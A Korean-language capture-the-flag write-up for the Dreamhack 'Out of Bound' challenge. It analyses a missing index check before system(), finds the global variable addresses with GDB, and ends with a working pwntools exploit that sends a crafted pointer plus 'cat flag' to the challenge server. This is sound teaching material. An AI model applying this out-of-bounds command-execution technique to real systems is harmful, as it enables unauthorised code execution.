# Out of Bound

## 1. 문제 정보

- **문제명:** Out of Bound (Dreamhack)
- **문제 링크:** https://dreamhack.io/wargame/challenges/11


## 2. 소스 코드 분석

문제에서 제공하는 `out_of_bound.c` 파일을 확인하였다.
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/8187cbc5-9678-43b2-8cf2-9dfb37ab1483" />

### 2-1. 전역 변수 선언

```c
char name[16];

char *command[10] = {
    "cat",
    "ls",
    "id",
    "ps",
    "file ./oob"
};
```

전역 변수로 `name`과 `command` 배열이 선언되어 있다.

- `name[16]`: 사용자로부터 입력받은 문자열을 저장하는 배열
- `command[10]`: 명령어 문자열이 저장된 주소를 보관하는 포인터 배열

`command` 배열은 총 10개의 원소를 가지고 있지만, 실제로 초기화된 명령어는 5개이다. 나머지 원소는 전역 변수의 초기화 규칙에 따라 NULL 포인터로 설정된다.

### 2-2. 사용자 입력

```c
printf("Admin name: ");
read(0, name, sizeof(name));

printf("What do you want?: ");
scanf("%d", &idx);
```

프로그램은 사용자로부터 두 가지 입력을 받는다.

1. `read()` 함수를 통해 입력받은 문자열을 `name` 배열에 저장한다.
2. `scanf()` 함수를 통해 정수형 인덱스 `idx`를 입력받는다.

`read()` 함수의 세 번째 인자로 `sizeof(name)`을 전달하므로 최대 16바이트까지 입력받을 수 있다.

### 2-3. 취약점 발생 부분

```c
system(command[idx]);
```

`system()` 함수는 전달받은 문자열을 운영체제의 명령어로 실행하는 함수이다.

이때 `command[idx]`를 통해 사용자가 입력한 인덱스에 해당하는 명령어를 가져온다.

하지만 `idx`가 `command` 배열의 유효한 인덱스 범위인 0~9에 포함되는지 검사하는 과정이 존재하지 않는다.

따라서 배열의 범위를 벗어난 인덱스를 입력하면 배열 외부의 메모리에 접근할 수 있다.

이처럼 배열의 유효한 범위를 벗어나 메모리에 접근하는 취약점을 **Out of Bounds(OOB)** 라고 한다.

## 3. 바이너리 보호기법 분석

`checksec` 명령어를 사용하여 바이너리의 보호기법을 확인하였다.

```bash
checksec --file=./out_of_bound
```

<img width="800" alt="Image" src="https://github.com/user-attachments/assets/25e9d92b-f0ea-4e40-892c-a76074d9b0ac" />

확인 결과는 다음과 같다.

| 보호기법 | 적용 여부 | 설명 |
|---|---|---|
| Arch | i386-32-little | 32비트 리틀엔디안 |
| RELRO | Partial RELRO | GOT 일부 보호 |
| Canary | Found | 스택 카나리 적용 |
| NX | Enabled | 스택 등의 메모리에서 코드 실행 방지 |
| PIE | No PIE | 바이너리 주소 고정 |
| Stripped | No | 심볼 정보 존재 |

이번 문제에서 중요한 보호기법은 **No PIE**이다.

PIE가 적용되지 않았기 때문에 바이너리의 전역 변수 주소가 실행할 때마다 변경되지 않는다. 따라서 GDB를 이용해 확인한 `command`와 `name`의 주소를 활용할 수 있다.

또한 이번 문제는 스택을 덮어쓰는 방식이 아닌 전역 변수의 배열 인덱스를 벗어나는 방식이므로 Canary와 NX를 직접적으로 우회할 필요가 없다.

## 4. GDB를 이용한 메모리 분석

### 4-1. main 함수 어셈블리 확인

GDB를 실행한 후 `main` 함수의 어셈블리 코드를 확인하였다.

```bash
gdb -q ./out_of_bound
```

```gdb
disassemble main
```

<img width="800" alt="Image" src="https://github.com/user-attachments/assets/12c2b2f8-067b-49cf-ae1f-6dbd542b6f3c" />
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/bba1693d-80de-46f6-ad70-0459b8f0f934" />

어셈블리 코드에서 다음 부분을 확인하였다.

```asm
mov eax, DWORD PTR [ebp-0x10]
mov eax, DWORD PTR [eax*4+0x804a060]
push eax
call system@plt
```

각 명령어의 역할은 다음과 같다.

1. `mov eax, DWORD PTR [ebp-0x10]`
   - 스택에 저장된 `idx` 값을 eax 레지스터에 저장한다.

2. `mov eax, DWORD PTR [eax*4+0x804a060]`
   - `command` 배열의 시작 주소에 인덱스와 포인터 크기인 4바이트를 곱한 값을 더해 해당 위치의 값을 가져온다.

3. `push eax`
   - 가져온 값을 함수 인자로 전달하기 위해 스택에 저장한다.

4. `call system@plt`
   - 전달받은 주소에 저장된 문자열을 운영체제 명령어로 실행한다.

이를 통해 `command[idx]`에 접근할 때 인덱스에 4를 곱하여 실제 메모리 주소를 계산한다는 사실을 확인하였다.

### 4-2. 전역 변수 주소 확인

<img width="800" alt="Image" src="https://github.com/user-attachments/assets/c6d6f4f6-cfcc-4b5d-81b5-65b3f15d02b3" />

GDB에서 다음 명령어를 실행하였다.

```gdb
p &command
p &name
```

확인 결과는 다음과 같다.

| 변수 | 시작 주소 |
|---|---|
| command | `0x0804a060` |
| name | `0x0804a0ac` |

두 주소의 차이를 계산하면 다음과 같다.

```text
0x0804a0ac - 0x0804a060 = 0x4c
0x4c = 76
```

`command` 배열의 원소는 포인터이며, 32비트 환경에서 포인터 하나의 크기는 4바이트이다.

따라서 두 주소 사이의 거리를 포인터 크기로 나누면 다음과 같다.

```text
76 / 4 = 19
```

즉, `command[19]`가 위치하는 메모리 주소가 `name` 배열의 시작 주소와 일치한다.

### 4-3. 메모리 값 확인

실제 메모리 값을 확인하기 위해 다음 명령어를 실행하였다.

```gdb
x/10wx 0x0804a060
```

확인 결과는 다음과 같다.

```text
0x0804a060 <command>:
0x080487f0
0x080487f4
0x080487f7
0x080487fa
0x080487fd
0x00000000
0x00000000
0x00000000
0x00000000
0x00000000
```

각 값은 명령어 문자열이 저장된 메모리 주소를 의미한다.

| 인덱스 | 메모리 주소 | 저장된 값 |
|---|---|---|
| 0 | `0x0804a060` | `0x080487f0` |
| 1 | `0x0804a064` | `0x080487f4` |
| 2 | `0x0804a068` | `0x080487f7` |
| 3 | `0x0804a06c` | `0x080487fa` |
| 4 | `0x0804a070` | `0x080487fd` |
| 5~9 | 이후 주소 | `0x00000000` |

이후 `name` 배열의 메모리도 확인하였다.

```gdb
x/4w 0x0804a0ac
```

확인 결과 모든 값이 `0x00000000`으로 출력되었다. 이는 아직 사용자 입력이 이루어지지 않았기 때문이다.

## 5. 취약점 발생 원리

앞서 확인한 주소를 다시 정리하면 다음과 같다.

- `command` 시작 주소: `0x0804a060`
- `name` 시작 주소: `0x0804a0ac`

`command` 배열의 각 원소는 4바이트이므로 인덱스 19를 입력했을 때 접근하는 주소는 다음과 같다.

$$
0x0804a060 + (19 \times 4)
= 0x0804a0ac
$$

이는 `name` 배열의 시작 주소와 동일하다.

원래 `command` 배열은 10개의 원소만 가지고 있으므로 유효한 인덱스는 0~9이다. 그러나 인덱스 검증이 없기 때문에 19를 입력하여 배열 외부의 메모리에 접근할 수 있다.

여기서 중요한 점은 `command[19]`가 `name` 배열 자체를 명령어로 실행하는 것이 아니라, `name`의 첫 4바이트를 포인터 주소로 해석한다는 것이다.

따라서 `name`에 원하는 주소와 명령어 문자열을 입력하면 `system()` 함수가 해당 명령어를 실행하도록 만들 수 있다.

## 6. 페이로드 구성

### 6-1. 페이로드 구조

`name` 배열의 시작 주소는 `0x0804a0ac`이다.

명령어 문자열을 `name`의 시작 주소에서 4바이트 뒤에 저장하기 위해 다음 주소를 사용한다.

```text
name + 4 = 0x0804a0b0
```

따라서 페이로드는 다음과 같은 구조로 구성한다.

```text
[p32(name + 4)] + [cat flag]
```

- 앞의 4바이트: 명령어 문자열이 저장된 주소
- 뒤의 문자열: 실제 실행할 명령어인 `cat flag`

`p32()`는 주소를 32비트 크기의 4바이트 데이터로 변환하는 pwntools 함수이다.

또한 x86 환경은 리틀엔디안 방식을 사용하므로 주소의 하위 바이트부터 메모리에 저장된다.

### 6-2. 익스플로잇 코드

Dreamhack에서 제공하는 원격 서버에 접속하기 위해 pwntools의 `remote()` 함수를 사용하였다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 12388)

name_addr = 0x0804a0ac

payload = p32(name_addr + 4)
payload += b'cat flag'

p.sendafter(b'Admin name: ', payload)
p.sendlineafter(b'What do you want?: ', b'19')

p.interactive()
```

<img width="800" alt="Image" src="https://github.com/user-attachments/assets/5eb28c61-c2a8-4064-ab14-853be2a7188c" />

코드 실행 과정은 다음과 같다.

1. Dreamhack 원격 서버에 접속한다.
2. `name` 배열에 `name+4` 주소와 `cat flag` 문자열을 입력한다.
3. 인덱스로 19를 전달한다.
4. `command[19]`를 통해 `name`에 저장한 주소를 참조한다.
5. `system()` 함수가 해당 주소에 저장된 `cat flag` 명령어를 실행한다.

### 6-3. FLAG 획득 결과

<img width="800" alt="Image" src="https://github.com/user-attachments/assets/dfb48ffd-848b-4eeb-840f-2f4f7d8772fe" />
<img width="800" alt="Image" src="https://github.com/user-attachments/assets/4c748352-c7c7-4554-ab92-812288270444" />

## 7. 결론 및 느낀 점

이번 문제를 통해 배열의 인덱스 범위 검증이 이루어지지 않을 경우, 의도하지 않은 메모리 영역에 접근할 수 있다는 점을 확인하였다.

특히 배열의 범위를 벗어나는 것에서 끝나는 것이 아니라, 전역 변수의 메모리 배치를 분석하여 다른 변수의 값을 포인터로 해석하게 만들 수 있다는 점이 핵심이었다.

또한 GDB를 이용해 전역 변수의 주소를 확인하고, 어셈블리 코드를 통해 배열 인덱스가 실제 메모리 주소로 변환되는 과정을 분석할 수 있었다.